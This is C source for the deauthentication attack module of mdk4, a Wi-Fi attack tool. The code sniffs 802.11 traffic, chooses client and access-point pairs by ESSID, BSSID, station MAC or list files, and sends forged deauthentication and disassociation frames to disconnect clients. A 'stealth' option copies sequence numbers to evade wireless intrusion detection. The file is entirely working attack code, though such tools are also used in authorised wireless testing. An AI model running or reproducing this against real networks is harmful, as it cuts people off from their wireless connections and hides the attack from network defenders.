#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>

#include "deauth.h"
#include "../osdep.h"
#include "../channelhopper.h"
#include "../greylist.h"
#include "../helpers.h"


#define DEAUTH_NAME "Deauthentication and Disassociation"
#define LIST_REREAD_PERIOD 3


//Global things, shared by packet creation and stats printing
static struct ether_addr bssid, station;
struct ether_addr mac_block;                 // MAC for d mode, -S
struct ether_addr bssid_block;               // MAC for d mode, -B
struct ether_addr essid_mac_block;           // MAC for d mode, -E
struct ether_addr white_mac;                 // white station MAC -W 
unsigned char essid_block[33] = {0};         // essid for d mode, -E
unsigned char essid_len;

void deauth_shorthelp()
{
  printf("  Sends deauthentication and disassociation packets to stations\n");
  printf("  based on data traffic to disconnect all clients from an AP.\n");
}

void deauth_longhelp()
{
  printf( "  Sends deauthentication and disassociation packets to stations\n"
	  "  based on data traffic to disconnect all clients from an AP.\n"
	  "      -w <filename>\n"
	  "         Read file containing MACs not to care about (Whitelist mode)\n"
	  "      -b <filename>\n"
	  "         Read file containing MACs to run test on (Blacklist Mode)\n"
	  "      -s <pps>\n"
	  "         Set speed in packets per second (Default: unlimited)\n"
      "      -x\n"
      "         Enable full IDS stealth by matching all Sequence Numbers\n"
      "         Packets will only be sent with clients' addresses\n"
	  "      -c [chan,chan,...,chan[:speed]]\n"
	  "         Enable channel hopping. When -c h is given, mdk4 will hop an all\n"
	  "         14 b/g channels. Channel will be changed every 3 seconds,\n"
	  "         if speed is not specified. Speed value is in milliseconds!\n"
	  "      -E <AP ESSID>\n"
	  "         Specify an AP ESSID to attack.\n"
	  "      -B <AP BSSID>\n"
	  "         Specify an AP BSSID to attack.\n"
	  "      -S <Station MAC address>\n"
	  "         Specify a station MAC address to attack.\n"
    "      -W <Whitelist Station MAC address>\n"
    "         Specify a whitelist station MAC.\n");
}


void *deauth_parse(int argc, char *argv[]) {
  int opt, speed;
  char *speedstr;
  struct deauth_options *dopt = malloc(sizeof(struct deauth_options));

  dopt->greylist = NULL;
  dopt->isblacklist = BLACKLIST_FROM_NONE;
  dopt->speed = 0;
  dopt->stealth = 0;

  dopt->blacklist = NULL;
  dopt->whitelist = NULL;

  dopt->blacklist_from_file = 0;
  dopt->blacklist_from_essid = 0;
  dopt->blacklist_from_bssid = 0;
  dopt->blacklist_from_station = 0;

  dopt->whitelist_from_file = 0;
  dopt->whitelist_from_station = 0;

  while ((opt = getopt(argc, argv, "w:b:s:xc:E:B:S:W:")) != -1) {
    switch (opt) {
    case 'w':
      dopt->whitelist = malloc(strlen(optarg) + 1); 
      strcpy(dopt->whitelist, optarg);
      dopt->whitelist_from_file = 1;
      break;
    case 'b':
      dopt->blacklist = malloc(strlen(optarg) + 1); 
      strcpy(dopt->blacklist, optarg);
      dopt->blacklist_from_file = 1;
      break;
    case 's':
	    dopt->speed = (unsigned int) atoi(optarg);
      break;
    case 'x':
      dopt->stealth = 1;
      break;
    case 'c':
      speed = 3000000;
      speedstr = strrchr(optarg, ':');
      if (speedstr != NULL) {
        speed = 1000 * atoi(speedstr + 1);
      }
      if (optarg[0] == 'h') {
        init_channel_hopper(NULL, speed);
      } else {
        init_channel_hopper(optarg, speed);
      }
      break;
	  case 'E':
  	essid_len = strlen(optarg);
  	memcpy(essid_block, optarg, essid_len);
    dopt->blacklist_from_essid = 1;
    //printf("-Blacklist ESSID MAC: %s\n", optarg);
	  break;
	  case 'B':
    bssid_block = parse_mac(optarg);
    dopt->blacklist_from_bssid = 1;
    //printf("-Blacklist BSSID MAC: %s\n", optarg);
	  break;
	  case 'S':
  	mac_block = parse_mac(optarg);
    dopt->blacklist_from_station = 1;
    //printf("-Blacklist Station MAC: %s\n", optarg);
	  break;
    case 'W':
    white_mac = parse_mac(optarg);
    dopt->whitelist_from_station = 1;
    //printf("-Whitelist Station MAC: %s\n", optarg);
    break;
    default:
  	deauth_longhelp();
  	printf("\n\nUnknown option %c\n", opt);
  	return NULL;
    }
  }

  return (void *) dopt;
}

struct ether_addr get_target_bssid()
{
	struct ether_addr mac_block;
	struct packet sniffed;
	struct ieee_hdr *hdr;

	while(1) {

		sniffed = osdep_read_packet();
		//if (sniffed.len == 0) exit(-1);
    if (sniffed.len == 0) {
      sleep(1);
      continue;
    }

		hdr = (struct ieee_hdr *) sniffed.data;
		if (hdr->type == IEEE80211_TYPE_BEACON )
		{
			if(! memcmp(sniffed.data+38, essid_block, sniffed.data[37])){
				memcpy(mac_block.ether_addr_octet, sniffed.data + 16, ETHER_ADDR_LEN);
				break;
			}
		}
	}

	return mac_block;
}

unsigned char accept_target(struct packet *pkt, struct deauth_options *dopt) {
  struct ether_addr smac = {0};
	struct ether_addr dmac = {0};
	struct ether_addr bssid = {0};
	struct ether_addr tmac = {0};

  struct ether_addr ap = {0};
  struct ether_addr client = {0};

  uint8_t dsflags;

  struct ieee_hdr *hdr = (struct ieee_hdr *) pkt->data;
  dsflags = hdr->flags & 0x03;

  if((hdr->type & 0x0F) != CONTROL_FRAME)
	{
			switch (dsflags) {
				case 0x00: //Ad Hoc, Beacons
				memcpy(dmac.ether_addr_octet, hdr->addr1.ether_addr_octet, ETHER_ADDR_LEN);
				memcpy(smac.ether_addr_octet, hdr->addr2.ether_addr_octet, ETHER_ADDR_LEN);
				memcpy(bssid.ether_addr_octet, hdr->addr3.ether_addr_octet, ETHER_ADDR_LEN);
				break;
				case 0x01: //From station to AP
				memcpy(bssid.ether_addr_octet, hdr->addr1.ether_addr_octet, ETHER_ADDR_LEN);
				memcpy(smac.ether_addr_octet, hdr->addr2.ether_addr_octet, ETHER_ADDR_LEN);
				memcpy(dmac.ether_addr_octet, hdr->addr3.ether_addr_octet, ETHER_ADDR_LEN);

				break;
				case 0x02: //From AP to station
				memcpy(dmac.ether_addr_octet, hdr->addr1.ether_addr_octet, ETHER_ADDR_LEN);
				memcpy(bssid.ether_addr_octet, hdr->addr2.ether_addr_octet, ETHER_ADDR_LEN);
				memcpy(smac.ether_addr_octet, hdr->addr3.ether_addr_octet, ETHER_ADDR_LEN);
				break;
				case 0x03: //WDS
				memcpy(bssid.ether_addr_octet, hdr->addr1.ether_addr_octet, ETHER_ADDR_LEN);
				memcpy(tmac.ether_addr_octet, hdr->addr2.ether_addr_octet, ETHER_ADDR_LEN);
				memcpy(dmac.ether_addr_octet, hdr->addr3.ether_addr_octet, ETHER_ADDR_LEN);
				memcpy(smac.ether_addr_octet, pkt->data + sizeof(struct ieee_hdr), ETHER_ADDR_LEN);
				break;
			}
	}
  else{
    return 1;
  }

  //if (! greylist) return 1; //Always accept when no black/whitelisting selected
  if(dopt->blacklist_from_file == 0 && dopt->blacklist_from_essid == 0 && 
    dopt->blacklist_from_bssid == 0 && dopt->blacklist_from_station == 0 &&
    dopt->whitelist_from_file == 0 && dopt->whitelist_from_station == 0)
    return 1;

  if(MAC_IS_BCAST(hdr->addr1))
    return 0;

  // If any of the Adresses is Blacklisted, ACCEPT target
  if (dopt->blacklist_from_file == 1) {
    if (is_blacklisted(hdr->addr1) || is_blacklisted(hdr->addr2) || is_blacklisted(hdr->addr3))
    {
      return 1;
    } 
  }

  if(dopt->blacklist_from_bssid == 1 && dopt->blacklist_from_station == 1)
  {
    if(MAC_MATCHES(bssid_block, bssid) && (MAC_MATCHES(mac_block, smac) || MAC_MATCHES(mac_block, dmac)))
    {
      return 1;
    }

    return 0;
  }

  if(dopt->blacklist_from_essid == 1 && dopt->blacklist_from_station == 1)
  {
    if((MAC_MATCHES(essid_mac_block, bssid)) && (MAC_MATCHES(mac_block, smac) || MAC_MATCHES(mac_block, dmac)))
    {
      return 1;
    }

    return 0;
  }

  if(dopt->blacklist_from_bssid == 1)
  {
   if(MAC_MATCHES(bssid_block, bssid))
   {
      if(dopt->whitelist_from_station == 1)
      {
        if(MAC_MATCHES(white_mac, smac) || MAC_MATCHES(white_mac, dmac))
          return 0;
      }

      if(dopt->whitelist_from_file == 1)
      {
        if (is_whitelisted(hdr->addr1)) return 0;
        if (is_whitelisted(hdr->addr2)) return 0;
        if (is_whitelisted(hdr->addr3)) return 0;
        if ((hdr->flags & 0x03) == 0x03) { //WDS...
          struct ether_addr *fourth = get_source(pkt);
          if (is_whitelisted(*fourth)) return 0;
        }
      }

      return 1;
    }
  }

  if(dopt->blacklist_from_essid == 1)
  {
     if(MAC_MATCHES(essid_mac_block, bssid))
     {
        if(dopt->whitelist_from_station == 1)
        {
          if(MAC_MATCHES(white_mac, smac) || MAC_MATCHES(white_mac, dmac))
            return 0;
        }

        if(dopt->whitelist_from_file == 1)
        {
          if (is_whitelisted(hdr->addr1)) return 0;
          if (is_whitelisted(hdr->addr2)) return 0;
          if (is_whitelisted(hdr->addr3)) return 0;
          if ((hdr->flags & 0x03) == 0x03) { //WDS...
            struct ether_addr *fourth = get_source(pkt);
            if (is_whitelisted(*fourth)) return 0;
          }
        }

        return 1;
     }
  }

  if(dopt->blacklist_from_station == 1)
  {
      if(MAC_MATCHES(mac_block, smac) || MAC_MATCHES(mac_block, dmac))
        return 1;
  }

  if(dopt->whitelist_from_file == 1)
  {
    if (is_whitelisted(hdr->addr1) || is_whitelisted(hdr->addr2) || is_whitelisted(hdr->addr3))
    {
      return 0;
    }
    else
    {
      return 1;
    } 
  }

  if(dopt->whitelist_from_station == 1)
  {
    if(MAC_MATCHES(white_mac, hdr->addr1) || MAC_MATCHES(white_mac, hdr->addr2) || MAC_MATCHES(white_mac, hdr->addr3))
    {
      return 0;
    }
    else
    {
      return 1;
    }
  }
  
  return 0;
}

unsigned char get_new_target(struct ether_addr *client, struct ether_addr *ap, struct deauth_options *dopt) {
  struct packet sniffed = {0};
  struct ieee_hdr *hdr;
  unsigned char wds = 0;

  if(dopt == NULL)
    return wds;

  while(1) {
    sniffed = osdep_read_packet();
    //if (sniffed.len == 0) exit(-1);
    if (sniffed.len == 0) {
      sleep(1);
      continue;
    }

    hdr = (struct ieee_hdr *) sniffed.data;

  if(dopt->blacklist_from_essid == 1){
    if(hdr->type == IEEE80211_TYPE_BEACON){
        if(! memcmp(sniffed.data+38, essid_block, sniffed.data[37])){
        memcpy(essid_mac_block.ether_addr_octet, sniffed.data + 16, ETHER_ADDR_LEN);
      }
    }
  }

    if((hdr->type & 0x0F) != 0x00 && (hdr->type & 0x0F) != 0x08)
      continue;

    if(hdr->type == IEEE80211_TYPE_BEACON || hdr->type == IEEE80211_TYPE_PROBEREQ || hdr->type == IEEE80211_TYPE_PROBERES)
      continue;

    if (dopt->stealth && ((hdr->flags & 0x03) != 0x01)) continue; //In stealth mode do not impersonate AP, IDS will figure out the duplicate SEQ number!

    if (accept_target(&sniffed, dopt)) break;
  }

  switch (hdr->flags & 0x03) {
    case 0x03: //WDS
      wds = 1;
      MAC_COPY(*client, hdr->addr3);
      MAC_COPY(*ap, hdr->addr1);
    break;
    case 0x01: //ToDS
      MAC_COPY(*client, hdr->addr3);
      MAC_COPY(*ap, hdr->addr2);
    break;
    case 0x02: //FromDS
      MAC_COPY(*client, hdr->addr1);
      MAC_COPY(*ap, hdr->addr2);

    break;
    case 0x00: //NoDS (AdHoc)
      MAC_COPY(*client, hdr->addr2);
      MAC_COPY(*ap, hdr->addr3);
    break;
  }

  set_seqno(NULL, get_seqno(&sniffed));  // Eff you, WIDS

  return wds;
}


struct packet deauth_getpacket(void *options) {
  struct deauth_options *dopt = (struct deauth_options *) options;
  static time_t t_prev = 0;
  static unsigned char wds, state = 0;
  struct packet pkt= {0};

  /*if (dopt->greylist) {
    if (t_prev == 0) {
      printf("Periodically re-reading blacklist/whitelist every %d seconds\n\n", LIST_REREAD_PERIOD);
    }
    if ((time(NULL) - t_prev) >= LIST_REREAD_PERIOD) {
      t_prev = time(NULL);
      load_greylist(dopt->isblacklist, dopt->greylist);
    }
  }*/

  if (t_prev == 0) {
    if(dopt->blacklist || dopt->whitelist)
      printf("Periodically re-reading blacklist/whitelist every %d seconds\n\n", LIST_REREAD_PERIOD);
  }
  if ((time(NULL) - t_prev) >= LIST_REREAD_PERIOD) {
    t_prev = time(NULL);

    if(dopt->blacklist){
      load_blacklist(dopt->blacklist);
    }

    if(dopt->whitelist){
      load_whitelist(dopt->whitelist);
    }
    
  }

  if (dopt->speed) sleep_till_next_packet(dopt->speed);

  get_new_target(&station, &bssid, dopt);

  if(!MAC_MATCHES(bssid, station))
  {
    switch (state) {
      case 0:
        //wds = get_new_target(&station, &bssid, dopt);
        state = 1;
        return create_deauth(bssid, station, bssid);
      break;
      case 1:
        state = 2;
        //if (wds) state = 4;
        //if (dopt->stealth) state = 0;
        return create_disassoc(bssid, station, bssid);
      break;
      case 2:
        state = 3;
        return create_deauth(station, bssid, bssid);
      break;
      case 3:
        //state = 0;
        state = 4;
        return create_disassoc(station, bssid, bssid);
      break;
      case 4:
        state = 5;
        return create_deauth(station, bssid, station);
      break;
      case 5:
        state = 0;
        return create_disassoc(station, bssid, station);
      break;
    }

    printf("\nIMPOSSIBLE! state = %d\n", state); exit(-1);
  }

  return pkt;

}


void deauth_print_stats(void *options) {
  int chan = osdep_get_channel();
  options = options; //Avoid unused warning

  if(!MAC_MATCHES(bssid, station))
  {
    printf("\rDisconnecting "); print_mac(station);
    printf(" from "); print_mac(bssid);

    if (chan) {
      printf(" on channel %d\n", chan);
    } else {
      printf("\n");
    }
  }

  
}


void deauth_perform_check(void *options) {
  //Nothing to check for beacon flooding attacks
  options = options; //Avoid unused warning
}


struct attacks load_deauth() {
  struct attacks this_attack;
  char *deauth_name = malloc(strlen(DEAUTH_NAME) + 1);
  strcpy(deauth_name, DEAUTH_NAME);

  this_attack.print_shorthelp = (fp) deauth_shorthelp;
  this_attack.print_longhelp = (fp) deauth_longhelp;
  this_attack.parse_options = (fpo) deauth_parse;
  this_attack.get_packet = (fpp) deauth_getpacket;
  this_attack.print_stats = (fps) deauth_print_stats;
  this_attack.perform_check = (fps) deauth_perform_check;
  this_attack.mode_identifier = DEAUTH_MODE;
  this_attack.attack_name = deauth_name;

  return this_attack;
}
